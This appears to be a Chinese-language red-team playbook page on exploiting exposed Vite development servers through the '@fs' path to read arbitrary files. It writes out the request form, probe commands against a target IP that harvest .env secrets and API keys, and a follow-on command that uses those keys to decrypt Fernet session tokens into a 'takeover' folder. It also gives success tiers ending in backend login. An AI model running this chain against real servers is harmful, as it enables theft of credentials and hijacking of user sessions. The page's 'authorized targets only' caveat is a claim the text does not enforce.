# Vite 开发服 `@fs` 任意读手法

> Skill：`杀招/快读`  
> 探针：`炼蛊房/vite_fs_probe.py`  
> 指纹：`tools/1day-kit/custom-templates/vite-fs-read.yaml`  
> 下游：`fernet-session-decrypt` · `tg-cloud-panel`  
> 红线：仅授权目标；只读，不写目标磁盘

---

## 0. 画像

Vite dev（常见 `:3000` / `:5173`）在错误暴露时允许：

`GET /@fs/<绝对路径>`  

可读容器内 `/etc/passwd`、`/app/package.json`、`.env` 等。前端容器常 **代理到 `backend:8000`**，密钥可能在后端挂载路径，需 `--extra` 继续探。

---

## 1. 命令

```bash
python3 炼蛊房/vite_fs_probe.py -u http://IP:3000 --case <案卷>
python3 炼蛊房/vite_fs_probe.py -u http://IP:3000 --case <案卷> \
  --extra /app/backend/.env --extra /data/.env

# 探针命中密钥时会写 案卷/vite_fs/keys_from_fs.env
python3 炼蛊房/fernet_session_decrypt.py decrypt \
  --token-file <session.json> \
  --keys-file 案卷/<案卷>/案卷/vite_fs/keys_from_fs.env \
  --out 案卷/<案卷>/接管/
```

---

## 2. 成功口径

| 级别 | 口径 |
|------|------|
| L1 | `/@fs/etc/passwd` 或 `package.json` 可读 |
| L2 | 读到 `.env` / 密钥 / api_hash |
| L3 | 密钥解开 Fernet session 或登录后端 |

---

## 3. 不要做

- 把 `@fs` 当 RCE  
- 只读到 passwd 就结案「已接管」
